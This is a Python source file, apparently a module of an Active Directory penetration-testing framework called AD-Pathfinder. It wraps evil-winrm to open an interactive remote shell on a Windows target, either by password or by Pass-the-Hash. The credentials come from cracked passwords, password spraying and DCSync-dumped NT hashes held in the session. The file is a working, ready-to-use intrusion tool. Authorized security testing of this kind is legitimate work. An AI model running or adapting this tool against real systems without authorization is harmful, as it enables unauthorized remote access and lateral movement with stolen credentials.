"""
evil_winrm_module.py - Evil-WinRM Remote Shell module for AD-Pathfinder.

Provides remote shell access to Windows systems via WinRM (port 5985/5986).
Supports both password and Pass-the-Hash authentication.

Tools used:
    - evil-winrm  (gem install evil-winrm)

Commands (from playbook):
    # Password authentication
    evil-winrm -i <target_ip> -u <user> -p <pass>

    # Pass-the-Hash
    evil-winrm -i <target_ip> -u <user> -H '<nt_hash>'
"""

from __future__ import annotations

import os
import subprocess
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore

# WinRM ports
WINRM_PORTS = {5985, 5986}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_evil_winrm(executor: CommandExecutor) -> bool:
    return executor.check_tool("evil-winrm")


def _pick_best_credentials(state: AssessmentState) -> dict:
    """Return best available credential set, preferring valid_credentials."""
    if state.valid_credentials:
        return state.valid_credentials[0]
    if state.initial_credentials.username:
        return {
            "username":  state.initial_credentials.username,
            "password":  state.initial_credentials.password,
            "ntlm_hash": state.initial_credentials.ntlm_hash,
        }
    return {"username": "", "password": "", "ntlm_hash": ""}


def _get_nt_hash_candidates(state: AssessmentState) -> list[dict]:
    """
    Return username+NT hash pairs from:
      1. state.ntlm_hashes (populated by DCSync)
      2. valid_credentials with ntlm_hash set
    """
    candidates = []
    for entry in getattr(state, "ntlm_hashes", []):
        if entry.get("nt") and entry.get("username"):
            candidates.append({"username": entry["username"], "nt": entry["nt"]})
    for cred in state.valid_credentials:
        if cred.get("ntlm_hash"):
            nt = cred["ntlm_hash"].split(":")[-1] if ":" in cred["ntlm_hash"] else cred["ntlm_hash"]
            candidates.append({"username": cred["username"], "nt": nt})
    return candidates


# ─────────────────────────────────────────────────────────────────────────────
# EvilWinRMModule
# ─────────────────────────────────────────────────────────────────────────────

class EvilWinRMModule:
    """
    Remote shell access via Evil-WinRM.

    Modes
    -----
    1. Password authentication:  evil-winrm -i <ip> -u <user> -p <pass>
    2. Pass-the-Hash:            evil-winrm -i <ip> -u <user> -H '<nt_hash>'

    The shell is launched interactively — control is handed to the operator.
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Launch Evil-WinRM shell.

        Returns
        -------
        dict
            {
                "status":  "success" | "error",
                "mode":    "password" | "pth",
                "user":    str,
                "command": str,
                "error":   str | None,
                "warnings":list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        if not _detect_evil_winrm(self.executor):
            return self._error(
                "evil-winrm not found. Install: gem install evil-winrm"
            )

        # ── Port check ────────────────────────────────────────────────────
        if WINRM_PORTS.isdisjoint(state.open_ports):
            warnings.append(
                "Port 5985/5986 not in open_ports. WinRM may not be available — "
                "run a port scan first or proceed manually."
            )

        # ── Mode selection ──────────────────────────────────────────
        console.print()
        console.rule("[bold bright_cyan]Evil-WinRM — Remote Shell[/bold bright_cyan]")
        console.print()

        pth_candidates = _get_nt_hash_candidates(state)

        console.print("  [bright_cyan]1.[/bright_cyan]  Password authentication")
        console.print("  [bright_cyan]2.[/bright_cyan]  Pass-the-Hash (NT hash)")
        console.print("  [bright_cyan]0.[/bright_cyan]  Cancel")
        console.print()

        mode_choice = Prompt.ask(
            "  [bold yellow]Select mode[/bold yellow]",
            choices=["0", "1", "2"],
            default="1",
        )

        if mode_choice == "0":
            return self._error("Cancelled by operator.")

        # ── Password mode ────────────────────────────────────────
        if mode_choice == "1":
            # Build cred pool from session
            _cred_pool: list[tuple[str, str, str]] = []

            def _add(u: str, p: str, src: str) -> None:
                if u and p and not any(c[0] == u and c[1] == p for c in _cred_pool):
                    _cred_pool.append((u, p, src))

            for cp in getattr(state, "cracked_passwords", []):
                _add(cp.get("username", ""), cp.get("password", ""), "cracked")
            for vc in state.valid_credentials:
                _add(vc.get("username", ""), vc.get("password", vc.get("ntlm_hash", "")), "spray")
            ic = state.initial_credentials
            if ic and ic.username:
                _add(ic.username, ic.password or ic.ntlm_hash, "session")

            username = ""
            password = ""

            if _cred_pool:
                _ct = Table(
                    title="[bold bright_cyan]Available Credentials[/bold bright_cyan]",
                    box=box.ROUNDED, border_style="bright_blue",
                    show_lines=True, expand=False,
                )
                _ct.add_column("#",        style="bold bright_cyan", width=4)
                _ct.add_column("Username", style="bold yellow",       width=26)
                _ct.add_column("Password", style="dim",               width=24)
                _ct.add_column("Source",   style="bright_blue",       width=10)
                for _i, (_u, _p, _s) in enumerate(_cred_pool, 1):
                    _pw_d  = f"[bold green]{_p}[/bold green]" if _s == "cracked" else _p
                    _src_d = "[bold green]cracked ✔[/bold green]" if _s == "cracked" else f"[bright_blue]{_s}[/bright_blue]"
                    _ct.add_row(str(_i), _u, _pw_d, _src_d)
                console.print(_ct)
                console.print()
                _pick = Prompt.ask(
                    "  [bold yellow]Select #[/bold yellow] (Enter to type manually)",
                    default="", show_default=False,
                ).strip()
                if _pick.isdigit():
                    _idx = int(_pick) - 1
                    if 0 <= _idx < len(_cred_pool):
                        username, password, _ = _cred_pool[_idx]
                        console.print(f"  [green]✔  Using: {username}[/green]")
            else:
                console.print("  [dim]No credentials in session — enter manually.[/dim]")
                console.print()

            if not username:
                username = Prompt.ask("  [bold yellow]Username[/bold yellow]", default="").strip()
            if not password and username:
                password = Prompt.ask("  [bold yellow]Password[/bold yellow]", default="").strip()

            if not username or not password:
                return self._error("No credentials provided.")

            cmd      = ["evil-winrm", "-i", state.target_ip, "-u", username, "-p", password]
            redacted = f"evil-winrm -i {state.target_ip} -u {username} -p ****"
            mode     = "password"

        # ── Pass-the-Hash mode ───────────────────────────────────
        else:
            username = ""
            nt_hash  = ""

            if pth_candidates:
                _ht = Table(
                    title="[bold bright_cyan]NT Hash Candidates[/bold bright_cyan]",
                    box=box.ROUNDED, border_style="bright_blue",
                    show_lines=True, expand=False,
                )
                _ht.add_column("#",        style="bold bright_cyan", width=4)
                _ht.add_column("Username", style="bold yellow",       width=26)
                _ht.add_column("NT Hash",  style="dim",               width=34)
                for _i, c in enumerate(pth_candidates[:10], 1):
                    _ht.add_row(str(_i), c["username"], c["nt"][:32] + "…")
                console.print(_ht)
                console.print()
                idx_str = Prompt.ask(
                    "  [bold yellow]Select # (or Enter to type manually)[/bold yellow]",
                    default="", show_default=False,
                ).strip()
                if idx_str.isdigit():
                    idx = int(idx_str) - 1
                    if 0 <= idx < len(pth_candidates):
                        username = pth_candidates[idx]["username"]
                        nt_hash  = pth_candidates[idx]["nt"]
            else:
                console.print("  [dim]No NT hashes in session. Run DCSync first.[/dim]")
                console.print()

            if not username:
                username = Prompt.ask("  [bold yellow]Username[/bold yellow]", default="").strip()
            if not nt_hash:
                nt_hash = Prompt.ask("  [bold yellow]NT Hash[/bold yellow]", default="").strip()

            if not username or not nt_hash:
                return self._error("No credentials provided.")

            cmd      = ["evil-winrm", "-i", state.target_ip, "-u", username, "-H", nt_hash]
            redacted = f"evil-winrm -i {state.target_ip} -u {username} -H '****'"
            mode     = "pth"

        # ── Launch panel ──────────────────────────────────────────
        console.print()
        _lt = Table(
            box=box.ROUNDED, border_style="green",
            show_header=False, expand=False,
        )
        _lt.add_column("K", style="bold bright_cyan", width=12)
        _lt.add_column("V", style="bold white")
        _lt.add_row("Target",   state.target_ip)
        _lt.add_row("User",     username)
        _lt.add_row("Auth",     "Password" if mode == "password" else "Pass-the-Hash")
        _lt.add_row("Port",     "5985 (HTTP)" if 5985 in state.open_ports else "5986 (HTTPS) / unknown")
        console.print(_lt)
        console.print()
        console.print("  [bold green]►  Shell starting — type [bold white]exit[/bold white] to return to AD-Pathfinder[/bold green]")
        console.print()

        try:
            # stderr=DEVNULL suppresses the Ruby/Reline warning noise
            proc = subprocess.run(cmd, stderr=subprocess.DEVNULL)
            exit_code = proc.returncode
        except FileNotFoundError:
            return self._error("evil-winrm not found on PATH.")
        except KeyboardInterrupt:
            exit_code = 0

        console.print()
        if exit_code == 0:
            console.print("  [bold green]✔  Session closed.[/bold green]")
        else:
            console.print(f"  [bold yellow]⚠  Session ended (exit code {exit_code}).[/bold yellow]")
        console.print()
        state.log_action(f"Evil-WinRM shell ({mode}): {username}@{state.target_ip}")
        state.log_finding(
            "Remote Shell",
            f"Evil-WinRM shell established ({mode}): {username}@{state.target_ip}",
            severity="CRITICAL",
        )

        return {
            "status":   "success",
            "mode":     mode,
            "user":     username,
            "command":  redacted,
            "error":    None,
            "warnings": warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":   "error",
            "mode":     "",
            "user":     "",
            "command":  "",
            "error":    message,
            "warnings": [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.evil_winrm_module import run as winrm_run
    result = winrm_run(state)
    """
    return EvilWinRMModule(executor).run(state)
